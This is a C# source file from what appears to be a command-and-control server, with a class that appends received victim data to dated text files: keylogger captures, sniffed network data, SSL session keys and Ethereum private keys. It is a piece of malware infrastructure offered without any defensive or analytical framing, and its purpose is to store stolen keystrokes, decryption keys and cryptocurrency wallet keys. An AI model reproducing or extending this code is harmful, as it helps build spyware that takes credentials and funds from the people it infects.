/*
    *This file write in .txt files all recived data, like a logs, keys, network data... 
*/

using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Command_and_Control_C_
{
    public class Files
    {
        String date;
        public Files()
        {
            DateTime localDate = DateTime.Now;
            var culture = new CultureInfo("en-GB");
            date = localDate.Day.ToString(culture)+"."+localDate.Month.ToString(culture)+"."+localDate.Year.ToString(culture);
        }

        public void writeLog(String x)
        {
            using (StreamWriter writer = new StreamWriter("./"+date+"_log.txt",true))
            {
                writer.WriteLine(x);
            }
        }
        public void writeKeylogger(String x)
        {
            using (StreamWriter writer = new StreamWriter("./"+date+"_keyLogger.txt",true))
            {
                writer.WriteLine(x);
            }
        }

        public void writeSKB(StringBuilder x)
        {
            using (StreamWriter writer = new StreamWriter("./"+date+"_networkData.txt",true))
            {
                writer.WriteLine(x);
            }
        }

        public void writeSslKeys(String key)
        {
            using (StreamWriter writer = new StreamWriter("./"+date+"_SSLKEYLOGFILE.txt",true))
            {
                writer.WriteLine(key);
            }
        }

        public void writeEthereumKey(String key)
        {
            using (StreamWriter writer = new StreamWriter("./"+date+"ethereumPrivateKey.txt",true))
            {
                writer.WriteLine(key);
            }
        }

    }
}